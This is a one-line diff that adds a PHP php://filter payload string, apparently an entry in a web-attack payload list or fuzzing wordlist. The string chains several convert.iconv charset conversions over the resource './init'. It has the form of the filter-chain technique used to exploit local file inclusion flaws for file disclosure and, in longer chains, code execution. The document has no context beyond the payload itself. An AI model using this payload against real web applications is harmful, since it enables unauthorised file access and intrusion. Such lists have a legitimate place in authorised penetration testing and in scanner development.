@@ -1,0 +1,1 @@
+php://filter/convert.iconv.Windows-1252.UCS-2LE|convert.iconv.ISO-2022-KR.CP1025|convert.iconv.KOI8-U.EUC-KR|convert.iconv.KOI8-R.CP866|convert.iconv.CP936.CP950/resource=./init
